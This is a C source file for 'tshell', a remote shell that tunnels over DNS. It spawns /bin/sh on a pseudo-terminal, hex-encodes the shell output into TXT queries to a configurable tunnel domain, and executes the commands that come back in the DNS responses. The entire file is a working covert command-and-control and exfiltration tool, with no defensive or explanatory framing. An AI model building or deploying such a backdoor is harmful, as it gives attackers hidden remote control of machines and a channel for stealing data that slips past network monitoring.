#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <resolv.h>
#include <termios.h>
#include <poll.h>
#include <unistd.h>
#include <time.h>

#ifdef __APPLE__
#include <util.h>
#else
#include <pty.h>
#endif

int CNTR;

//#define TUNNEL "tunnel.yourdomain.com"

int ahex2int(char a, char b) {
    a = (a <= '9') ? a - '0' : (a & 0x7) + 9;
    b = (b <= '9') ? b - '0' : (b & 0x7) + 9;
    return (a << 4) + b;
}

#define LABEL_LIMIT 20


int comms (int tfd, char *data )
{
    char txmit[200];
    memset(txmit, 0, sizeof(txmit));

    if( strlen(data) > 30) {
        fprintf(stderr, "[tshell] WARNING: too much data\n");
        return 0;
    }

    int idx = 0;
    int oidx = 0;
    for (; data[idx] != 0x00; idx++, oidx += 2) {
        sprintf(&txmit[oidx],"%02X", data[idx]);
    }
    if (txmit[0] == 0x00) {
        txmit[0] = '0';
        txmit[1] = '0';
    }
    sprintf(&txmit[strlen(txmit)], "-%x-%x." TUNNEL, CNTR++, rand());


    unsigned char buffer[NS_PACKETSZ];
    int resp_len;
    ns_msg h;
    ns_rr rr;
    int rrnum;

    memset(&rr, 0, sizeof(rr));
    memset(&h, 0, sizeof(h));


    if ( (resp_len = res_query(txmit, ns_c_in, ns_t_txt, buffer, sizeof(buffer))) < 0 ) {
        fprintf(stderr, "Query for %s failed!\n", txmit);
        return -1;
    }


    if ( ns_initparse( buffer, resp_len, &h ) ) {
        fprintf( stderr, "Failed to parse response buffer!\n");
        return -1;
    }

    for ( rrnum=0; rrnum < ns_msg_count(h, ns_s_an); rrnum++ ) {

        if ( ns_parserr( &h, ns_s_an, rrnum, &rr ) ) {
            fprintf( stderr, "ns_parserr: %s\n", strerror(errno) );
            return -1;
        }

        if ( ns_rr_type(rr) == ns_t_txt ) {
            char txt[1024];
            memset(txt, 0, sizeof(txt));

            char n;
            n = *(char *)ns_rr_rdata(rr);

            if (n > 0) {
                memset(txt, 0, sizeof(txt));
                memcpy(txt, ns_rr_rdata(rr) + 1, n);

                if (txt[1] == 0) {
                    return 0;
                } else {
                    char out[1024];
                    memset(out, 0, sizeof(out));
                    for (int i = 0, j = 0; txt[i]; i += 2, j++) {
                        out[j] = ahex2int(txt[i], txt[i+1]);
                    }
                    write(tfd, out, strlen(out));
                }
            }
        }
    }



    return 0;
}



int main () {
    srand(time(NULL));

    res_init();

    int tfd;
    pid_t pid;

    pid = forkpty(&tfd, NULL, NULL, NULL);

    struct termios terminal;
    tcgetattr(tfd, &terminal);
    terminal.c_lflag &= ~ECHO;
    tcsetattr(tfd, TCSANOW, &terminal);

    if (pid == 0) {
        setsid();
        execl("/bin/sh", "sh", NULL);
    } else {

        struct pollfd pfds[2];
        pfds[0].fd = tfd;
        pfds[0].events = POLLERR|POLLIN;


        char buf[LABEL_LIMIT + 1];
        int ret = 0;
        for (;;) {
            ret = poll(pfds, 1, 100);
            if (ret == -1) {
                printf("[tshell] poll ret\n");
                exit(-1);
            }
            memset(buf, 0, sizeof(buf));


            //check socketa
            if (pfds[0].revents & POLLIN) {
                memset(buf, 0, sizeof(buf));
                ret = read(pfds[0].fd, buf, sizeof(buf) - 1);
                comms(tfd, buf);
            }

            if (ret == 0) {
                //poll the dns service
                buf[0] = 0x00;
                buf[1] = 0x00;
                comms(tfd, buf);
            }

        }
    }

}
